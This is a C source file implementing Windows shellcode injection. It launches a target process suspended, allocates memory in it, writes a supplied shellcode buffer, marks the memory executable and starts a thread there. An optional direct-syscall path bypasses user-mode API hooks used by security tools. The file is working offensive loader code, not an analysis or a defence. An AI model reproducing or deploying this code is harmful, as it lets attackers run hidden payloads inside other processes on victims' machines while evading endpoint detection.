#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

/* defined in start_thread.c */
void start_thread(HANDLE hProcess, PROCESS_INFORMATION pi, LPVOID lpStartAddress);

/* inject some shellcode... enclosed stuff is the shellcode y0 */
void inject_process(HANDLE hProcess, PROCESS_INFORMATION pi, LPCVOID buffer, SIZE_T length) {
	LPVOID ptr = NULL;
	SIZE_T wrote;
	DWORD  old;

	/* allocate memory in our process */
#if USE_SYSCALLS == 1
	SIZE_T size = length + 128;
   NtAllocateVirtualMemory(hProcess, &ptr, 0, &size, MEM_COMMIT, PAGE_READWRITE);
#else
	ptr = (LPVOID)VirtualAllocEx(hProcess, 0, length + 128, MEM_COMMIT, PAGE_READWRITE);
#endif

	/* write our shellcode to the process */
#if USE_SYSCALLS == 1
   NtWriteVirtualMemory(hProcess, ptr, (PVOID) buffer, length, &wrote);
   NtFlushInstructionCache(hProcess, ptr, wrote);
#else
	WriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T *)&wrote);
#endif
	if (wrote != length)
		return;

	/* change permissions */
#if USE_SYSCALLS == 1
   NtProtectVirtualMemory(hProcess, &ptr, &size, PAGE_EXECUTE_READ, &old);
#else
	VirtualProtectEx(hProcess, ptr, length, PAGE_EXECUTE_READ, &old);
#endif

	/* create a thread in the process */
	start_thread(hProcess, pi, ptr);
}

/* inject some shellcode... enclosed stuff is the shellcode y0 */
void inject(LPCVOID buffer, int length, char * processname) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hProcess   = NULL;
	char cmdbuff[1024];

	if (processname == NULL || strlen(processname) == 0) {
		hProcess = GetCurrentProcess();
	}
	else {
		/* reset some stuff */
		ZeroMemory( &si, sizeof(si) );
		si.cb = sizeof(si);
		ZeroMemory( &pi, sizeof(pi) );

		/* setup our path... choose wisely for 32bit and 64bit platforms */
		_snprintf(cmdbuff, 1024, "%s", processname);

		/* spawn it baby! */
		if (!CreateProcessA(NULL, cmdbuff, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
			return;

		hProcess = pi.hProcess;
	}

	if( !hProcess )
		return;

	inject_process(hProcess, pi, buffer, length);
}
